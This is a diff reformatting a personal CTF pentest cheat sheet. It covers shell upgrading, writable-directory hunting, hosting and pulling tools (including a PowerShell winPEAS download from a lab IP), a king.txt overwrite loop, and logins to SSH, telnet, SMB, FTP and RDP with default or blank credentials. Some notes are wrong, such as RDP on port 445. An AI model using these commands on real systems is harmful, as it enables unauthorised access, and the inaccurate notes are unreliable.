@@ -60,7 +60,7 @@ MY PENTEST CHEAT SHEET AND BASIC KALI SETUP/TROUBLESHOOT COMMANDS
 
 Linux Tools, Scripts & Services
 
-- Bash Scripts (For CTF)
+- Bash Scripts (For CTF)  
   ` $ python3 -c ‘import pty;pty.spawn(“/bin/bash”)’ `  → pop sh to bash shell 
 
 - Exploit PATH Hijacking
@@ -81,85 +81,78 @@ Linux Tools, Scripts & Services
 
 - Enumeration for user executable location ` $ find / -type d -maxdepth 2 -writable -exec ls -l {} + 2>/dev/null `
 ```
-+ $ find / -type d -maxdepth 2 -writable -exec ls -l {} 2> + /dev/null (THIS ONE DOSENT WORKS)
-  -  / : Scan the entire device
-  - -type d : Scan for directories only (No files)
-  - -maxdepth : The max depth (subfolders) to scan
-  - -writable : Check if current user an write in folder
-  - -exec : Execute a command on the results returned by find ls
-  -l {} + : List the output in long form ( {} is placeholder for the location where result of the find command is substituted. The + at the end is used to terminate the -exec command)
+ $ find / -type d -maxdepth 2 -writable -exec ls -l {} 2> + /dev/null (THIS ONE DOSENT WORKS)
+    / : Scan the entire device
+   -type d : Scan for directories only (No files)
+   -maxdepth : The max depth (subfolders) to scan
+   -writable : Check if current user an write in folder
+   -exec : Execute a command on the results returned by find ls
+   -l {} + : List the output in long form ( {} is placeholder for the location where result of the find command is substituted. The + at the end is used to terminate the -exec command)
 ```
 
 
-+ $ python3 -m http.server {port} (ip before port is optional i guess) - host file to download on target system, File should be in the same folder where the hosting service is started
+### Hosting Server using python  
+ `$ python3 -m http.server {port}` (ip before port is optional i guess) - host file to download on target system, File should be in the same folder where the hosting service is started  
 
-+ $ wget {ip}:port/filename
+### Download a file using "wget" and to get headers using "curl"  
+` $ wget {ip}:port/filename `
 
-+ $ “curl” is more likely to read the content of files in linux whereas wget is to download the files!!!
-
-+ $ curl –head {IP} - To get the header of the website.
+ $ “curl” is more likely to read the content of files in linux whereas wget is to download the files!!!   
+` $ curl –head {IP} ` - To get the header of the website.  
   - for eg. i got “X-Backend-Server: office.paper” for 10.10.11.143 so i added this ip in /etc/hosts following with the IP like this “10.10.11.143 office.paper” and then went to search [http://office.paper](http://office.paper/) and the i got the website running which was earlier showing default apache page bcos it was not set up.   
-  
 
-+ $ powershell “curl|wget” http://10.0.0.1/winPEASx64.exe -outfile winPEASx64.exe
 
-## FOR CTF :
+` $ powershell “curl|wget” http://10.0.0.1/winPEASx64.exe -outfile winPEASx64.exe `
+
+### FOR CTF :
 ```
 Finding total flags xD (ctf ezz) $ find / -name flag.txt 2> /dev/null
 
 while true; do echo “yassk” > /root/king.txt; done &
 ```
-==========================================================================================
+==========================================================
 
-## KALI LINUX TROUBLE-SHOOTS AND BASICS
+### KALI LINUX TROUBLE-SHOOTS AND BASICS
 
-1. Unable to download or install packages using "apt-get"
+1. Unable to download or install packages using "apt-get"  
+    file path = `/etc/apt/sources.list`  
+    We have to uncomment 2nd source link in sources.list file to be able to use "sudo apt-get install" command.  
+    After uncommenting use "sudo apt-get update" to update the changes and reflect in our kali system. Then re-run the command not working  
     
-    file path = /etc/apt/sources.list
-    
-    We have to uncomment 2nd source link in sources.list file to be able to use "sudo apt-get install" command.
-    After uncommenting use "sudo apt-get update" to update the changes and reflect in our kali system. Then re-run the command not working
-    
-2. Update kali to latest version
-    
-    kali@kali:~$sudo apt update
-    
-    kali@kali:~$ sudo apt full-upgrade -y
+2. Update kali to latest version  
+    `kali@kali:~$sudo apt update`  
+    `kali@kali:~$ sudo apt full-upgrade -y`  
    
-3. Shells
-    
-    echo $SHELL -  to print current shell
-    
-    chsh - to change the current shell.
-    
-    There are couple of shells in kali from which we can use, currently zsh is by default in my machine.
+3. Shells  
+    `echo $SHELL` -  to print current shell  
+    `chsh` - to change the current shell.  
+    There are couple of shells in kali from which we can use, currently zsh is by default in my machine.  
     
 
 # SERVICES
 ### SSH
-+ $ ssh {ip} - default pass:root $ssh user@ip -p 8080 - port not necessary for default ssh.
+` $ ssh {ip} `- default pass:root $ssh user@ip -p 8080 - port not necessary for default ssh.  
 
-+ $ ssh -L 80:localhost:80 user@IP - Here 80 is port we can use our own(better we use 80 so that we dont have to setup a proxy of another port) and localhost is DNS resolution(URL)
-OR
-+ $ ssh -D port user@ip - this is used for port forwarding, replace port with the port u want to forward it to, setup foxy proxy on SOCKS5 to get that port forwarding to show webpage.
+` $ ssh -L 80:localhost:80 user@IP ` - Here 80 is port we can use our own(better we use 80 so that we dont have to setup a proxy of another port) and localhost is DNS resolution(URL)  
+OR  
+` $ ssh -D port user@ip ` - this is used for port forwarding, replace port with the port u want to forward it to, setup foxy proxy on SOCKS5 to get that port forwarding to show webpage.  
 
 ### TELNET
-+ $ telnet {IP} used name root (can be admin, administration) and connects instantly.
+` $ telnet {IP} ` : used name is root to connect (can be admin, administration) and connects instantly.  
 
 ### SMBCLIENT
-+ $ smbclient 
+` $ smbclient `   
+` $ smbclient -L {IP} ` : (Used -L to show list of host) List of host shows up, now tried to connect with every host and “WorkShares” works with no password if is not configured properly.  
 
-+ $ smbclient -L {IP} (Used -L to show list of host) List of host shows up, now tried to connect with every host and “WorkShares” works with no password if is not configured properly.
-
-+ $ smbclient "\\\\{IP}\\username$" OR "//{IP}/username$" - To connect to listed users.
+` $ smbclient "\\\\{IP}\\username$" OR "//{IP}/username$" `- To connect to listed users.  
 
 ### FTP
-+ $ ftp {IP} {port} - port optional username: Anonymous (only this username works if unconfigured) password: anything would work
+` $ ftp {IP} {port} ` - port optional username: Anonymous (only this username works if unconfigured) password: anything would work  
 
 ### FREERDP
-+ $ xfreerdp - microsoft-ds 445 aka remote desktop protocol 
+` $ xfreerdp ` - microsoft-ds 445 aka remote desktop protocol   
 
-+ xfreerdp /v:10.0.0.0 /cert:ignore /u:user(”Administrator” can be default) /p:password (password optional, we can skip this flag)
+` xfreerdp /v:10.0.0.0 /cert:ignore /u:user`(”Administrator” can be default) `/p:password `(password optional, we can skip this flag)
 
 
 # Tools
